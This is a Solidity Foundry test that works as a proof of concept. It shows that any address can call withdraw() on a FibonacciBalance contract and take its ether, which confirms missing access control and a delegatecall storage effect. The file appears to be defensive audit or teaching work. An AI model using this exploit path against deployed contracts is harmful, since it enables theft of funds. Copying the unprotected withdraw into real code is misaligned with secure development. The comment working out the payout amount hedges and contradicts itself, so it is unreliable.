
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {FibonacciBalance, FibonacciLib} from "../src/FibonacciBalance.sol";

contract TestAccessControlFibonacciBalance is Test {
    FibonacciBalance public fibonacciBalance;
    FibonacciLib public fibonacciLib;

    function setUp() public {
        // Deploy the FibonacciLib first
        fibonacciLib = new FibonacciLib();
        
        // Deploy FibonacciBalance with initial funds (10 ether)
        fibonacciBalance = new FibonacciBalance{value: 10 ether}(address(fibonacciLib));
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals (Dynamic)
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the contract addresses themselves
        vm.assume(caller != address(fibonacciBalance));
        vm.assume(caller != address(fibonacciLib));
        
        // The withdraw function has NO access control - there are no privileged roles to exclude
        // This IS the vulnerability: ANY address can call withdraw()

        // --- 2. State Configuration ---
        
        // The contract was deployed with 10 ether in setUp
        // The first withdrawal will transfer 1 ether (fibonacci(1) = 1)
        
        // Record initial state
        uint256 initialContractBalance = address(fibonacciBalance).balance;
        uint256 initialCallerBalance = caller.balance;
        uint256 initialWithdrawalCounter = fibonacciBalance.withdrawalCounter();

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Call the unprotected withdraw function
        // This should succeed for ANY caller, demonstrating the vulnerability
        fibonacciBalance.withdraw();

        // Assert that the withdrawal actually happened
        // The withdrawal counter should have incremented
        assertEq(
            fibonacciBalance.withdrawalCounter(), 
            initialWithdrawalCounter + 1, 
            "Withdrawal counter should increment"
        );
        
        // The caller should have received ether
        // First withdrawal: fibonacci(1) = start + 1 = 3 + 1 = 4, so 4 ether
        // But looking at the lib: fibonacci(1) returns start + 1 where start defaults to 0 in the lib
        // Due to delegatecall, start in FibonacciBalance is 3, so fibonacci(1) = 3 + 1 = 4
        // Actually, for n=1: return start + 1, and start in FibonacciBalance slot 2 is 3
        // So calculatedFibNumber = 4, and transfer is 4 ether
        
        // The contract balance should have decreased
        assertLt(
            address(fibonacciBalance).balance, 
            initialContractBalance, 
            "Contract balance should decrease after withdrawal"
        );
        
        // The caller should have received funds
        assertGt(
            caller.balance, 
            initialCallerBalance, 
            "Caller should receive ether from withdraw"
        );
    }
}
